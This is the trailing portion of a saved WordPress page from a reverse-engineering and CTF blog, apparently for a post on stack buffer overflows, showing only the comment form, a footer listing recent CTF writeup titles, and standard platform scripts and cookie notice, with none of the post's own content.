	<div id="comment-form-comment"><textarea aria-hidden="true" tabindex="-1" style="position: absolute; inset: -999px auto auto 0px; border: 0px none; padding: 0px; box-sizing: content-box; overflow-wrap: break-word; height: 0px !important; min-height: 0px !important; overflow: hidden; transition: none 0s ease 0s; font-family: Arial, Helvetica, Tahoma, Verdana, sans-serif; font-size: 14px; font-weight: 400; font-style: normal; letter-spacing: 0px; text-transform: none; text-decoration: rgba(0, 0, 0, 0.7); word-spacing: 0px; text-indent: 0px; line-height: 18px; width: 718px;" class="autosizejs ">Enter your comment here...</textarea><textarea id="comment" name="comment" title="Enter your comment here..." placeholder="Enter your comment here..." style="height: 38px; overflow: hidden; overflow-wrap: break-word; resize: none;"></textarea></div>
</div>

<div id="comment-form-identity" style="display: none;">
	<div id="comment-form-nascar">
		<p>Fill in your details below or click an icon to log in:</p>
		<ul>
			<li class="selected" style="display:none;">
				<a href="#comment-form-guest" id="postas-guest" class="nascar-signin-link" title="Login via Guest">
									</a>
			</li>
			<li>
				<a href="#comment-form-load-service:WordPress.com" id="postas-wordpress" class="nascar-signin-link" title="Login via WordPress.com">
					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#0087be" d="M12.158 12.786l-2.698 7.84c.806.236 1.657.365 2.54.365 1.047 0 2.05-.18 2.986-.51-.024-.037-.046-.078-.065-.123l-2.762-7.57zM3.008 12c0 3.56 2.07 6.634 5.068 8.092L3.788 8.342c-.5 1.117-.78 2.354-.78 3.658zm15.06-.454c0-1.112-.398-1.88-.74-2.48-.456-.74-.883-1.368-.883-2.11 0-.825.627-1.595 1.51-1.595.04 0 .078.006.116.008-1.598-1.464-3.73-2.36-6.07-2.36-3.14 0-5.904 1.613-7.512 4.053.21.008.41.012.58.012.94 0 2.395-.114 2.395-.114.484-.028.54.684.057.74 0 0-.487.058-1.03.086l3.275 9.74 1.968-5.902-1.4-3.838c-.485-.028-.944-.085-.944-.085-.486-.03-.43-.77.056-.742 0 0 1.484.114 2.368.114.94 0 2.397-.114 2.397-.114.486-.028.543.684.058.74 0 0-.488.058-1.03.086l3.25 9.665.897-2.997c.456-1.17.684-2.137.684-2.907zm1.82-3.86c.04.286.06.593.06.924 0 .912-.17 1.938-.683 3.22l-2.746 7.94c2.672-1.558 4.47-4.454 4.47-7.77 0-1.564-.4-3.033-1.1-4.314zM12 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"></path></g></svg>				</a>
			</li>
			<li>
			<iframe id="googleplus-sign-in" name="googleplus-sign-in" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/a.html" scrolling="no" allowtransparency="true" seamless="seamless" width="24" height="24" frameborder="0"></iframe>
			</li>
			<li>
				<a href="#comment-form-load-service:Twitter" id="postas-twitter" class="nascar-signin-link" title="Login via Twitter">
					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#1DA1F2" d="M22.23 5.924c-.736.326-1.527.547-2.357.646.847-.508 1.498-1.312 1.804-2.27-.793.47-1.67.812-2.606.996C18.325 4.498 17.258 4 16.078 4c-2.266 0-4.103 1.837-4.103 4.103 0 .322.036.635.106.935-3.41-.17-6.433-1.804-8.457-4.287-.353.607-.556 1.312-.556 2.064 0 1.424.724 2.68 1.825 3.415-.673-.022-1.305-.207-1.86-.514v.052c0 1.988 1.415 3.647 3.293 4.023-.344.095-.707.145-1.08.145-.265 0-.522-.026-.773-.074.522 1.63 2.038 2.817 3.833 2.85-1.404 1.1-3.174 1.757-5.096 1.757-.332 0-.66-.02-.98-.057 1.816 1.164 3.973 1.843 6.29 1.843 7.547 0 11.675-6.252 11.675-11.675 0-.178-.004-.355-.012-.53.802-.578 1.497-1.3 2.047-2.124z"></path></g></svg>				</a>
			</li>
			<li>
				<a href="#comment-form-load-service:Facebook" id="postas-facebook" class="nascar-signin-link" title="Login via Facebook">
					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#3B5998" d="M20.007 3H3.993C3.445 3 3 3.445 3 3.993v16.013c0 .55.445.994.993.994h8.62v-6.97H10.27V11.31h2.346V9.31c0-2.325 1.42-3.59 3.494-3.59.993 0 1.847.073 2.096.106v2.43h-1.438c-1.128 0-1.346.537-1.346 1.324v1.734h2.69l-.35 2.717h-2.34V21h4.587c.548 0 .993-.445.993-.993V3.993c0-.548-.445-.993-.993-.993z"></path></g></svg>				</a>
			</li>
		</ul>
	</div>

	<div id="comment-form-guest" class="comment-form-service selected">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
<a href="https://gravatar.com/site/signup/" target="_blank">				<img src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Gravatar" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-0" width="25">
</a>			</div>

				<div class="comment-form-fields">
				<div class="comment-form-field comment-form-email">
					<label for="email">Email <span class="required">(required)</span> <span class="nopublish">(Address never made public)</span></label>
					<div class="comment-form-input"><input id="email" name="email" type="email"></div>
				</div>
				<div class="comment-form-field comment-form-author">
					<label for="author">Name <span class="required">(required)</span></label>
					<div class="comment-form-input"><input id="author" name="author" type="text"></div>
				</div>
				<div class="comment-form-field comment-form-url">
					<label for="url">Website</label>
					<div class="comment-form-input"><input id="url" name="url" type="url"></div>
				</div>
			</div>
			
		</div>
	</div>

	<div id="comment-form-wordpress" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/ad516503a11cd5ca435acc9bb6523536.png" alt="WordPress.com Logo" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-1" width="25">
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="wp_avatar" id="wordpress-avatar" class="comment-meta-wordpress" value="">
				<input type="hidden" name="wp_user_id" id="wordpress-user_id" class="comment-meta-wordpress" value="">
				<input type="hidden" name="wp_access_token" id="wordpress-access_token" class="comment-meta-wordpress" value="">
						<p class="comment-form-posting-as pa-wordpress">
			<strong></strong>
			You are commenting using your <span class="skimlinks-unlinked">WordPress.com</span> account.			<span class="comment-form-log-out">
				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'wordpress' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
			</span>
			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#0087be" d="M12.158 12.786l-2.698 7.84c.806.236 1.657.365 2.54.365 1.047 0 2.05-.18 2.986-.51-.024-.037-.046-.078-.065-.123l-2.762-7.57zM3.008 12c0 3.56 2.07 6.634 5.068 8.092L3.788 8.342c-.5 1.117-.78 2.354-.78 3.658zm15.06-.454c0-1.112-.398-1.88-.74-2.48-.456-.74-.883-1.368-.883-2.11 0-.825.627-1.595 1.51-1.595.04 0 .078.006.116.008-1.598-1.464-3.73-2.36-6.07-2.36-3.14 0-5.904 1.613-7.512 4.053.21.008.41.012.58.012.94 0 2.395-.114 2.395-.114.484-.028.54.684.057.74 0 0-.487.058-1.03.086l3.275 9.74 1.968-5.902-1.4-3.838c-.485-.028-.944-.085-.944-.085-.486-.03-.43-.77.056-.742 0 0 1.484.114 2.368.114.94 0 2.397-.114 2.397-.114.486-.028.543.684.058.74 0 0-.488.058-1.03.086l3.25 9.665.897-2.997c.456-1.17.684-2.137.684-2.907zm1.82-3.86c.04.286.06.593.06.924 0 .912-.17 1.938-.683 3.22l-2.746 7.94c2.672-1.558 4.47-4.454 4.47-7.77 0-1.564-.4-3.033-1.1-4.314zM12 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"></path></g></svg></span>
		</p>
					</div>
	
		</div>
	</div>

	<div id="comment-form-googleplus" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Google photo" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-2" width="25">
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="googleplus_avatar" id="googleplus-avatar" class="comment-meta-googleplus" value="">
				<input type="hidden" name="googleplus_user_id" id="googleplus-user_id" class="comment-meta-googleplus" value="">
				<input type="hidden" name="googleplus_access_token" id="googleplus-access_token" class="comment-meta-googleplus" value="">
						<p class="comment-form-posting-as pa-googleplus">
			<strong></strong>
			You are commenting using your Google account.			<span class="comment-form-log-out">
				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'googleplus' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
			</span>
			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" x="0px" y="0px" viewBox="0 0 60 60"><path fill="#519bf7" d="M56.3,30c0,-1.6 -0.2,-3.4 -0.6,-5h-3.1H42.2H30v10.6h14.8C44,39.3 42,42 39.1,43.9l8.8,6.8C53,46 56.3,39 56.3,30z"></path><path fill="#3db366" d="M30,57.5c6.7,0 13.1,-2.4 17.9,-6.8l-8.8,-6.8c-2.5,1.6 -5.6,2.4 -9.1,2.4c-7.2,0 -13.3,-4.7 -15.4,-11.2l-9.3,7.1C9.8,51.3 19.1,57.5 30,57.5z"></path><path fill="#fdc600" d="M5.3,42.2l9.3,-7.1c-0.5,-1.6 -0.8,-3.3 -0.8,-5.1s0.3,-3.5 0.8,-5.1l-9.3,-7.1C3.5,21.5 2.5,25.6 2.5,30S3.5,38.5 5.3,42.2z"></path><path fill="#f15b44" d="M40.1,17.4l8,-8C43.3,5.1 37,2.5 30,2.5C19.1,2.5 9.8,8.7 5.3,17.8l9.3,7.1c2.1,-6.5 8.2,-11.1 15.4,-11.1C33.9,13.7 37.4,15.1 40.1,17.4z"></path></svg></span>
		</p>
					</div>
	
		</div>
	</div>

	<div id="comment-form-twitter" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Twitter picture" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-3" width="25">
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="twitter_avatar" id="twitter-avatar" class="comment-meta-twitter" value="">
				<input type="hidden" name="twitter_user_id" id="twitter-user_id" class="comment-meta-twitter" value="">
				<input type="hidden" name="twitter_access_token" id="twitter-access_token" class="comment-meta-twitter" value="">
						<p class="comment-form-posting-as pa-twitter">
			<strong></strong>
			You are commenting using your Twitter account.			<span class="comment-form-log-out">
				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'twitter' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
			</span>
			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#1DA1F2" d="M22.23 5.924c-.736.326-1.527.547-2.357.646.847-.508 1.498-1.312 1.804-2.27-.793.47-1.67.812-2.606.996C18.325 4.498 17.258 4 16.078 4c-2.266 0-4.103 1.837-4.103 4.103 0 .322.036.635.106.935-3.41-.17-6.433-1.804-8.457-4.287-.353.607-.556 1.312-.556 2.064 0 1.424.724 2.68 1.825 3.415-.673-.022-1.305-.207-1.86-.514v.052c0 1.988 1.415 3.647 3.293 4.023-.344.095-.707.145-1.08.145-.265 0-.522-.026-.773-.074.522 1.63 2.038 2.817 3.833 2.85-1.404 1.1-3.174 1.757-5.096 1.757-.332 0-.66-.02-.98-.057 1.816 1.164 3.973 1.843 6.29 1.843 7.547 0 11.675-6.252 11.675-11.675 0-.178-.004-.355-.012-.53.802-.578 1.497-1.3 2.047-2.124z"></path></g></svg></span>
		</p>
					</div>
	
		</div>
	</div>

	<div id="comment-form-facebook" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Facebook photo" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-4" width="25">
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="fb_avatar" id="facebook-avatar" class="comment-meta-facebook" value="">
				<input type="hidden" name="fb_user_id" id="facebook-user_id" class="comment-meta-facebook" value="">
				<input type="hidden" name="fb_access_token" id="facebook-access_token" class="comment-meta-facebook" value="">
						<p class="comment-form-posting-as pa-facebook">
			<strong></strong>
			You are commenting using your Facebook account.			<span class="comment-form-log-out">
				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'facebook' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
			</span>
			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#3B5998" d="M20.007 3H3.993C3.445 3 3 3.445 3 3.993v16.013c0 .55.445.994.993.994h8.62v-6.97H10.27V11.31h2.346V9.31c0-2.325 1.42-3.59 3.494-3.59.993 0 1.847.073 2.096.106v2.43h-1.438c-1.128 0-1.346.537-1.346 1.324v1.734h2.69l-.35 2.717h-2.34V21h4.587c.548 0 .993-.445.993-.993V3.993c0-.548-.445-.993-.993-.993z"></path></g></svg></span>
		</p>
					</div>
	
		</div>
	</div>


	<div id="comment-form-load-service" class="comment-form-service">
		<div class="comment-form-posting-as-cancel"><a href="javascript:HighlanderComments.cancelExternalWindow();">Cancel</a></div>
		<p>Connecting to %s</p>
	</div>

</div>

<script type="text/javascript">
var highlander_expando_javascript = function(){
	var input = document.createElement( 'input' ),
	    comment = jQuery( '#comment' );

	if ( 'placeholder' in input ) {
		comment.attr( 'placeholder', jQuery( '.comment-textarea label' ).remove().text() );
	}

	// Expando Mode: start small, then auto-resize on first click + text length
	jQuery( '#comment-form-identity' ).hide();
	jQuery( '#comment-form-subscribe' ).hide();
	jQuery( '#commentform .form-submit' ).hide();

	comment.css( { 'height':'10px' } ).one( 'focus', function() {
		var timer = setInterval( HighlanderComments.resizeCallback, 10 )
		jQuery( this ).animate( { 'height': HighlanderComments.initialHeight } ).delay( 100 ).queue( function(n) { clearInterval( timer ); HighlanderComments.resizeCallback(); n(); } );
		jQuery( '#comment-form-identity' ).slideDown();
		jQuery( '#comment-form-subscribe' ).slideDown();
		jQuery( '#commentform .form-submit' ).slideDown();
	});
}
jQuery(document).ready( highlander_expando_javascript );
</script>

<div id="comment-form-subscribe" style="display: none;">
	<p class="comment-subscription-form"><input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;"> <label class="subscribe-label" id="subscribe-label" for="subscribe" style="display: inline;">Notify me of new comments via email.</label></p><p class="post-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto;"> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog" style="display: inline;">Notify me of new posts via email.</label></p></div>




<p class="form-submit" style="display: none;"><input name="submit" type="submit" id="comment-submit" class="submit" value="Post Comment"> <input type="hidden" name="comment_post_ID" value="79" id="comment_post_ID">
<input type="hidden" name="comment_parent" id="comment_parent" value="0">
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="a9aeeb45db"></p>
<input type="hidden" name="genseq" value="1593004762">
<p style="display: none;"></p><input type="hidden" id="ak_js" name="ak_js" value="1593004766006"></form>	</div><!-- #respond -->
	<div style="clear: both"></div>
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->

		</div><!-- #content -->

		<footer id="colophon" class="site-footer" role="contentinfo">
							<div class="footer-widgets clear">
					<div class="widget-areas">
													<div class="widget-area">
										<aside id="recent-posts-1" class="widget widget_recent_entries">		<h1 class="widget-title">Recent Posts</h1>		<ul>
											<li>
					<a href="https://reversingpwn.wordpress.com/2020/01/06/reversing-arkavidia-ctf/">Reversing Arkavidia CTF</a>
											<span class="post-date">January 6, 2020</span>
									</li>
											<li>
					<a href="https://reversingpwn.wordpress.com/2020/01/03/36c3-ctf-writeup/">36C3 CTF Writeup</a>
											<span class="post-date">January 3, 2020</span>
									</li>
											<li>
					<a href="https://reversingpwn.wordpress.com/2019/10/24/unmask-jit-engine-part-0x1/">jittery crackme writeup: unmask jit engine (part&nbsp;0x1)</a>
											<span class="post-date">October 24, 2019</span>
									</li>
											<li>
					<a href="https://reversingpwn.wordpress.com/2019/09/29/1ot-writeup/">Writeup : 1ot wreck-it&nbsp;CTF</a>
											<span class="post-date">September 29, 2019</span>
									</li>
											<li>
					<a href="https://reversingpwn.wordpress.com/2019/07/10/iscc-ctf-writeup-php-in-asm/">ISCC CTF Writeup : PHP in&nbsp;ASM</a>
											<span class="post-date">July 10, 2019</span>
									</li>
					</ul>
		</aside>			<div id="atatags-286348-5ef352dab86a7" data-adtags-width="949"></div>
			
			<script>
				__ATA.cmd.push(function() {
					__ATA.initDynamicSlot({
						id: 'atatags-286348-5ef352dab86a7',
						location: 140,
						formFactor: '003',
						label: {
							text: 'Advertisements',
						},
						creative: {
							reportAd: {
								text: 'Report this ad',
							},
							privacySettings: {
								text: 'Privacy settings',
							}
						}
					});
				});
			</script>							</div><!-- .widget-area -->
						
						
											</div><!-- .widget-areas -->
				</div><!-- .footer-widgets -->
						<div class="site-info">
				<a href="https://wordpress.com/?ref=footer_custom_powered" rel="nofollow">Powered by WordPress.com</a>.
				
							</div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #content-wrapper -->
</div><style>.ata-controls__complain-btn:hover,
.ata-controls__privacy-btn:hover {
    color: #666666 !important;
}
.ata-controls__complain-btn:active,
.ata-controls__privacy-btn:active {
    color: #5ac8fa !important;
}
.ata-controls__complain-btn_clicked,
.ata-controls__complain-btn_clicked:hover,
.ata-controls__complain-btn_clicked:active {
    color: #000 !important;
    cursor: default !important;
}
.ata-frame-wrapper {
    overflow: hidden;
    position: relative;
}
</style><!-- #page -->

<!--  -->
<script src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/gprofiles.js"></script>
<script>
var WPGroHo = {"my_hash":""};
</script>
<script type="text/javascript" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/wpgroho.js"></script>

	<script>
		//initialize and attach hovercards to all gravatars
		jQuery( document ).ready( function( $ ) {

			if (typeof Gravatar === "undefined"){
				return;
			}

			if ( typeof Gravatar.init !== "function" ) {
				return;
			}			

			Gravatar.profile_cb = function( hash, id ) {
				WPGroHo.syncProfileData( hash, id );
			};
			Gravatar.my_hash = WPGroHo.my_hash;
			Gravatar.init( 'body', '#wp-admin-bar-my-account' );
		});
	</script>

		<div style="display:none">
	<div class="grofile-hash-map-d7ea009529d9c8db6cf12c108b7b486a">
	</div>
	<div class="grofile-hash-map-7ff68b740876b0714f63b642add6cdd2">
	</div>
	<div class="grofile-hash-map-d7ea009529d9c8db6cf12c108b7b486a">
	</div>
	<div class="grofile-hash-map-bdf703ca189c88e9dbfdbeceb143f583">
	</div>
	</div>
<script>
var HighlanderComments = {"loggingInText":"Logging In\u2026","submittingText":"Posting Comment\u2026","postCommentText":"Post Comment","connectingToText":"Connecting to %s","commentingAsText":"%1$s: You are commenting using your %2$s account.","logoutText":"Log Out","loginText":"Log In","connectURL":"https:\/\/reversingpwn.wordpress.com\/public.api\/connect\/?action=request","logoutURL":"https:\/\/reversingpwn.wordpress.com\/wp-login.php?action=logout&_wpnonce=0c68337ca6","homeURL":"https:\/\/reversingpwn.wordpress.com\/","postID":"79","gravDefault":"identicon","enterACommentError":"Please enter a comment","enterEmailError":"Please enter your email address here","invalidEmailError":"Invalid email address","enterAuthorError":"Please enter your name here","gravatarFromEmail":"This picture will show whenever you leave a comment. Click to customize it.","logInToExternalAccount":"Log in to use details from one of these accounts.","change":"Change","changeAccount":"Change Account","comment_registration":"0","userIsLoggedIn":"","isJetpack":"","text_direction":"ltr"};
</script>
<script type="text/javascript" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/a"></script>
		<!-- CCPA [start] -->
		<script type="text/javascript">
			( function () {

				var setupPrivacy = function() {

					document.addEventListener( 'DOMContentLoaded', function() {

						// Minimal Mozilla Cookie library
						// https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie/Simple_document.cookie_framework
						var cookieLib = window.cookieLib = {getItem:function(e){return e&&decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*"+encodeURIComponent(e).replace(/[\-\.\+\*]/g,"\\$&")+"\\s*\\=\\s*([^;]*).*$)|^.*$"),"$1"))||null},setItem:function(e,o,n,t,r,i){if(!e||/^(?:expires|max\-age|path|domain|secure)$/i.test(e))return!1;var c="";if(n)switch(n.constructor){case Number:c=n===1/0?"; expires=Fri, 31 Dec 9999 23:59:59 GMT":"; max-age="+n;break;case String:c="; expires="+n;break;case Date:c="; expires="+n.toUTCString()}return"rootDomain"!==r&&".rootDomain"!==r||(r=(".rootDomain"===r?".":"")+document.location.hostname.split(".").slice(-2).join(".")),document.cookie=encodeURIComponent(e)+"="+encodeURIComponent(o)+c+(r?"; domain="+r:"")+(t?"; path="+t:"")+(i?"; secure":""),!0}};

						var setDefaultOptInCookie = function() {
							var value = '1YNN';
							var domain = '.wordpress.com' === location.hostname.slice( -14 ) ? '.rootDomain' : location.hostname;
							cookieLib.setItem( 'usprivacy', value, 365 * 24 * 60 * 60, '/', domain );
						};

						var setCcpaAppliesCookie = function( value ) {
							var domain = '.wordpress.com' === location.hostname.slice( -14 ) ? '.rootDomain' : location.hostname;
							cookieLib.setItem( 'ccpa_applies', value, 24 * 60 * 60, '/', domain );
						}

						var maybeCallDoNotSellCallback = function() {
							if ( 'function' === typeof window.doNotSellCallback ) {
								return window.doNotSellCallback();
							}

							return false;
						}

						var usprivacyCookie = cookieLib.getItem( 'usprivacy' );

						if ( null !== usprivacyCookie ) {
							maybeCallDoNotSellCallback();
							return;
						}

						var ccpaCookie = cookieLib.getItem( 'ccpa_applies' );

						if ( null === ccpaCookie ) {

							var request = new XMLHttpRequest();
							request.open( 'GET', 'https://public-api.wordpress.com/geo/', true );

							request.onreadystatechange = function () {
								if ( 4 === this.readyState ) {
									if ( 200 === this.status ) {

										var data = JSON.parse( this.response );
										var ccpa_applies = data['region'] && data['region'].toLowerCase() === 'california';

										setCcpaAppliesCookie( ccpa_applies );

										if ( ccpa_applies ) {
											if ( maybeCallDoNotSellCallback() ) {
												setDefaultOptInCookie();
											}
										}
									} else {
										setCcpaAppliesCookie( true );
										if ( maybeCallDoNotSellCallback() ) {
											setDefaultOptInCookie();
										}
									}
								}
							};

							request.send();
						} else {
							if ( ccpaCookie === 'true' ) {
								if ( maybeCallDoNotSellCallback() ) {
									setDefaultOptInCookie();
								}
							}
						}
					} );
				};

				if ( window.defQueue && defQueue.isLOHP && defQueue.isLOHP === 2020 ) {
					defQueue.items.push( setupPrivacy );
				} else {
					setupPrivacy();
				}

			} )();
		</script>

		<!-- CCPA [end] -->
					<script type="text/javascript">
			( function( $ ) {
				$( document.body ).on( 'post-load', function () {
					if ( typeof __ATA.insertInlineAds === 'function' ) {
						__ATA.insertInlineAds();
					}
				} );
			} )( jQuery );
			</script>
	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/reversingpwn.wordpress.com\/2017\/07\/08\/stack-buffer-overflow-part-ii\/":79};
	</script>
				<script type="text/javascript" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/a.js"></script>
<script type="text/javascript">
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?m=1363304414h&amp;ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script>
var comment_like_text = {"loading":"Loading..."};
</script>
<script>
var actionbardata = {"siteID":"131353854","siteName":"Reversing and Pwning","siteURL":"http:\/\/reversingpwn.wordpress.com","icon":"<img alt='' src='https:\/\/s0.wp.com\/i\/logo\/wpcom-gray-white.png' class='avatar avatar-50' height='50' width='50' \/>","canManageOptions":"","canCustomizeSite":"","isFollowing":"","themeSlug":"pub\/independent-publisher-2","signupURL":"https:\/\/wordpress.com\/start\/","loginURL":"https:\/\/wordpress.com\/log-in?redirect_to=https%3A%2F%2Freversingpwn.wordpress.com%2F2017%2F07%2F08%2Fstack-buffer-overflow-part-ii%2F&signup_flow=account","themeURL":"https:\/\/wordpress.com\/theme\/independent-publisher-2\/","xhrURL":"https:\/\/reversingpwn.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"f66c980e3a","isSingular":"1","isFolded":"","isLoggedIn":"","isMobile":"","subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"85f7d09720\" \/>","referer":"https:\/\/reversingpwn.wordpress.com\/2017\/07\/08\/stack-buffer-overflow-part-ii\/?relatedposts_hit=1&relatedposts_origin=67&relatedposts_position=0","canFollow":"1","feedID":"68082208","statusMessage":"","customizeLink":"https:\/\/reversingpwn.wordpress.com\/wp-admin\/customize.php?url=https%3A%2F%2Freversingpwn.wordpress.com%2F2017%2F07%2F08%2Fstack-buffer-overflow-part-ii%2F%3Frelatedposts_hit%3D1%26relatedposts_origin%3D67%26relatedposts_position%3D0","postID":"79","shortlink":"https:\/\/wp.me\/p8T98y-1h","canEditPost":"","editLink":"https:\/\/wordpress.com\/post\/reversingpwn.wordpress.com\/79","statsLink":"https:\/\/wordpress.com\/stats\/post\/79\/reversingpwn.wordpress.com","i18n":{"view":"View site","follow":"Follow","following":"Following","edit":"Edit","login":"Log in","signup":"Sign up","customize":"Customize","report":"Report this content","themeInfo":"Get theme: Independent Publisher 2","shortlink":"Copy shortlink","copied":"Copied","followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/read\">Reader<\/a>","foldBar":"Collapse this bar","unfoldBar":"Expand this bar","editSubs":"Manage subscriptions","viewReader":"View site in Reader","viewReadPost":"View post in Reader","subscribe":"Sign me up","enterEmail":"Enter your email address","followers":"","alreadyUser":"Already have a WordPress.com account? <a href=\"https:\/\/wordpress.com\/log-in?redirect_to=https%3A%2F%2Freversingpwn.wordpress.com%2F2017%2F07%2F08%2Fstack-buffer-overflow-part-ii%2F&signup_flow=account\">Log in now.<\/a>","stats":"Stats"}};
</script>
<script>
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
</script>
<script type="text/javascript" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/a_002.js"></script><div class="widget widget_eu_cookie_law_widget" style="display: block;"><div class="hide-on-button ads-active" data-hide-timeout="30" data-consent-expiration="180" id="eu-cookie-law">
	<form method="post">
		<input type="submit" value="Close and accept" class="accept">

		Privacy &amp; Cookies: This site uses cookies. By continuing to use this website, you agree to their use. <br>
To find out more, including how to control cookies, see here:
		<a href="https://automattic.com/cookies">
			Cookie Policy		</a>
 </form>
</div>
